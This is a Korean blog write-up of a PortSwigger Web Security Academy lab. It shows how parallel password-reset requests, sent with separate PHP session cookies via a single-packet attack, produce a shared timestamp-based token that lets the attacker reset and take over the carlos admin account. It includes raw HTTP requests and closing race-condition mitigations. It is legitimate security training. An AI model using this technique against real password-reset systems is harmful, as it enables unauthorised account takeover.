---
layout: post
title: "Burp Academy-레이스컨디션 관련 취약점: Exploiting time-sensitive vulnerabilities"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 레이스컨디션, Race Condition]
toc: true
last_modified_at: 2023-09-22 14:33:00 +0900
---


# 개요
- 새로 추가된 레이스 컨디션 관련 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities
- 취약점 설명페이지: https://portswigger.net/web-security/race-conditions#time-sensitive-attacks
- 난이도: PRACTITIONER (보통)

# 문제 개요
- 문제 사이트에는 패스워드 재설정 기능이 있다. 
- 이 기능에는 레이스 컨디션 취약점이 없지만, 적절한 타이밍의 요청을 보내서 암호화 메커니즘을 부술 수 있다. 이를 이용해서 관리자인 carlos계정으로 로그인하고 이 계정을 삭제하면 문제가 풀린다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 

```
This lab contains a password reset mechanism. Although it doesn't contain a race condition, you can exploit the mechanism's broken cryptography by sending carefully timed requests.

To solve the lab:

Identify the vulnerability in the way the website generates password reset tokens.
Obtain a valid password reset token for the user carlos.
Log in as carlos.
Access the admin panel and delete the user carlos.
You can log into your account with the following credentials: wiener:peter
```

# 어떻게 풀지 생각
- 타임스탬프를 사용하는 패스워드 재설정 토큰은 시간만 맞으면 사용할 수 있다는 듯하다. 
- 예를 들어 calors유저가 패스워드 리셋을 시도하는 것과 정확히 동일한 시간에 wiener유저가 패스워드 리셋을 시도하면 동일한 토큰을 얻을 수 있지 않을까?

# 살펴보기
1. My account 메뉴에서 Forgot password? 를 클릭하면 패스워드 재설정을 할 수 있다. 

2. 패스워드 재설정 화면에서 이메일 주소를 입력한다. 

![이메일 주소를 입력](/images/burp-academy-race-condition-6-1.png)

이 때의 요청은 다음과 같다. 

```http
POST /forgot-password HTTP/2
Host: 0adb00840427152583e68e0600bc0012.web-security-academy.net
Cookie: phpsessionid=F9KJ3EBPrnm3WKTkijUxcNdMeGc8foKb
Content-Length: 115
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0adb00840427152583e68e0600bc0012.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adb00840427152583e68e0600bc0012.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=tKqlcI2CaWVqcE7NlF0LUMPi0rBZKfz6&username=wiener%40exploit-0a4f003c0412152583078d2e012700de.exploit-server.net
```

3. 해당 이메일 주소로 링크가 전달된다. 

`https://0adb00840427152583e68e0600bc0012.web-security-academy.net/forgot-password?user=wiener&token=efc16f1d95d770d60f57680d7b9ec38439a0547d`와 같은 식으로 token 파라메터가 있는 것을 볼 수 있다. 만약 동일한 타이밍에 패스워드 리셋을 시도했다면 `https://0adb00840427152583e68e0600bc0012.web-security-academy.net/forgot-password?user=calros&token=efc16f1d95d770d60f57680d7b9ec38439a0547d` 같은 식으로 user 파라메터만 calros로 변경하면 calros유저의 패스워드를 변경 가능할 것이다. 

![전달된 링크](/images/burp-academy-race-condition-6-2.png)

4. exploit 서버가 주어져있다. calros 유저에게 어떤 HTTP 요청을 실행시킬 수 있다는 뜻이다. `POST /forgot-password` 를 실행시키는 javascript를 실행시키면 될 것이다. 그런데 패스워드 재설정에는 이메일 주소가 필요하다. 관리자의 이메일 주소를 모르는데 어떻게 패스워드 재요청을 실행시킬 수 있을까? 

패스워드 재설정 화면을 다시 잘 보면 이메일 주소 뿐만 아니라 username으로도 패스워드 재설정 요청을 할 수 있는 것을 알 수 있다. 

```http
POST /forgot-password HTTP/2
Host: 0adb00840427152583e68e0600bc0012.web-security-academy.net
Cookie: phpsessionid=F9KJ3EBPrnm3WKTkijUxcNdMeGc8foKb
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0adb00840427152583e68e0600bc0012.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adb00840427152583e68e0600bc0012.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=tKqlcI2CaWVqcE7NlF0LUMPi0rBZKfz6&username=calros
```

5. 다시 생각해보니 exploit서버를 사용하지 않아도 될 것 같다. calros 자신이 실행하지 않더라도 공격자 스스로 calros 유저의 패스워드 재설정 요청을 할 수 있기 때문이다. 

6. calors 유저의 패스워드 재설정 요청과 wiener본인의 패스워드 재설정 요청을 그룹으로 묶어서 Single Packet Attack하면 동일한 타이밍에 서버로 전달할 수 있다. 그다음에는 동일한 토큰을 가지고 calors유저의 패스워드를 재설정 할 수 있을 것이다. 

# 풀이 시도 

그런데 시도를 해보면 Invalid token이라고 나온다. 

1. Single Packet Attack으로 동일한 타이밍에 carlos 유저와 wiener유저의 패스워드 재설정 요청을 보낸다. 
![Single Packet Attack](/images/burp-academy-race-condition-6-3.png)

2. 이메일을 확인한다. 
![이메일 확인](/images/burp-academy-race-condition-6-4.png)

3. 이메일 링크를 복사해서 username만 carlos로 변경해서 요청을 보내본다. 그러면 서버가 Invalid token이라고 회신한다. 몇 번 다시 시도해봐도 동일했다. 

![재설정 요청보내기](/images/burp-academy-race-condition-6-5.png)

음... 모르겠다. 답을 보자. 

# 답을 보고 풀이
## Study the behavior
- 서버의 행동을 연구한다. 동일한 유저의 토큰 재설정 요청을 동시에 보내도 메일로 도착하는 토큰이 상이하다는 내용이 적혀있다. 서버는 토큰 생성을 요청을 순차적으로 처리하고 있는 것을 추론할 수 있다. 

## Bypass the per-session locking restriction
- 서버가 세션 쿠키를 관리할 때 PHP 세션 쿠키를 사용하고 있는 것을 알아챈다. **PHP는 세션당 한번에 하나의 요청만 처리하도록 설계되어 있다.**
- 따라서 동일한 세션으로 동일한 타이밍에 두 개의 요청을 보내도 서버는 순차적으로 처리하기 때문에 패스워드 재설정 토큰값이 달라지는 것이다! (이 부분이 포인트다. 이 부분까지는 미처 생각치 못했다.)
- `GET /forgot-password` 요청을 보낼 때 세션 쿠키를 삭제하고 보내면 서버는 새로운 세션 쿠키와 CSRF토큰을 발급해서 응답에 포함시켜서 회신해준다. 
- 이를 이용해서 두 개의 서로 다른 세션토큰을 사용하는 `POST /forgot-password` 요청을 보내본다. 몇 번 테스트해보면 서버측의 처리시간이 거의 동일한, 어떨 때는 완전히 동일한 것을 볼 수 있다. 

## 풀이 
1. 서로 다른 세션 쿠키 값과 CSRF토큰 값을 가지는 두 개의 요청을 준비한다. 

요청1: wiener유저의 패스워드 재설정 요청

```http
POST /forgot-password HTTP/2
Host: 0abf003704cf19a783b374b8000f004a.web-security-academy.net
Cookie: phpsessionid=V0cIpM0AVtHZgGHIQpR8Qbej7xpnKC8Y
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abf003704cf19a783b374b8000f004a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


csrf=FI3cEVMm92CmMKXG9x29pqxeCxpb8tMS&username=wiener
```

요청2: carlos 유저의 패스워드 재설정 요청

```http
POST /forgot-password HTTP/2
Host: 0abf003704cf19a783b374b8000f004a.web-security-academy.net
Cookie: phpsessionid=E2eCnKntPBu7ixgyQujdNSp8xD1Mx3wA
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abf003704cf19a783b374b8000f004a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


csrf=Xf9fIPgkvh8NB5gRZYktoxUsLosQ4QDb&username=carlos
```

2. 두 개의 요청을 Single Packet Attack을 이용해서 동일한 타이밍에 전송한다. 

3. 그리고 도착한 메일의 링크를 복사한 뒤에 파라메터 username을 carlos로 변경한다. 

4. 변경한 URL로 접속해보면 이번에는 변경이 가능한 화면이 출력된다! 

![carlos 유저 패스워드 변경화면](/images/burp-academy-race-condition-6-6.png)

5. 패스워드를 변경하고 변경한 패스워드로 carlos유저로 로그인한 뒤, 관리자 패널에서 carlos유저를 삭제하면 문제 풀이에 성공했다는 메세지가 출력된다. 

![문제 풀이 성공](/images/burp-academy-race-condition-6-success.png)


# Race Condition 취약점 방어 방법
레이스 컨디션 취약점으로부터 애플리케이션을 적절하게 보호하려면 다음 전략을 적용하여 모든 민감한 엔드포인트에서 하위 상태를 제거하는 것이 좋다. 

1. Avoid mixing data from different storage places.
   (다른 저장 장소의 데이터를 섞어서 사용하지 마세요.)

2. Ensure sensitive endpoints make state changes atomic by using the datastore's concurrency features. For example, use a single database transaction to check the payment matches the cart value and confirm the order.
   (데이터 저장소의 동시성 기능을 사용하여 민감한 엔드포인트가 상태 변경을 원자적으로 만들도록 합니다. 예를 들어, 단일 데이터베이스 트랜잭션을 사용하여 지불이 카트 값과 일치하는지 확인하고 주문을 확인합니다.)

3. As a defense-in-depth measure, take advantage of datastore integrity and consistency features like column uniqueness constraints.
	(다층 방어 조치로 열 고유성 제약 조건과 같은 데이터 저장소 무결성 및 일관성 기능을 활용하세요.)

4. Don't attempt to use one data storage layer to secure another. For example, sessions aren't suitable for preventing limit overrun attacks on databases.
	(한 데이터 저장 계층을 사용하여 다른 계층을 보호하려고 하지 마십시오. 예를 들어, 세션은 데이터베이스에 대한 제한 초과 공격을 방지하는 데 적합하지 않습니다.)

5. Ensure your session handling framework keeps sessions internally consistent. Updating session variables individually instead of in a batch might be a tempting optimization, but it's extremely dangerous. This goes for ORMs too; by hiding away concepts like transactions, they're taking on full responsibility for them.
	(세션 처리 프레임워크가 세션을 내부적으로 일관되게 유지하도록 하세요. 세션 변수를 일괄 처리가 아닌 개별적으로 업데이트하는 것은 매력적인 최적화일 수 있지만 매우 위험합니다. 이는 ORM에도 해당합니다. 트랜잭션과 같은 개념을 숨기면 ORM은 트랜잭션에 대한 모든 책임을 지게 됩니다.)

6. In some architectures, it may be appropriate to avoid server-side state entirely. Instead, you could use encryption to push the state client-side, for example, using JWTs. Note that this has its own risks, as we've covered extensively in our topic on JWT attacks.
	(일부 아키텍처에서는 서버 측 상태를 완전히 피하는 것이 적절할 수 있습니다. 대신 암호화를 사용하여 상태를 클라이언트 측에 푸시할 수 있습니다(예: JWT 사용). JWT 공격 에 대한 주제에서 광범위하게 다루었듯이 이는 고유한 위험이 있습니다.)
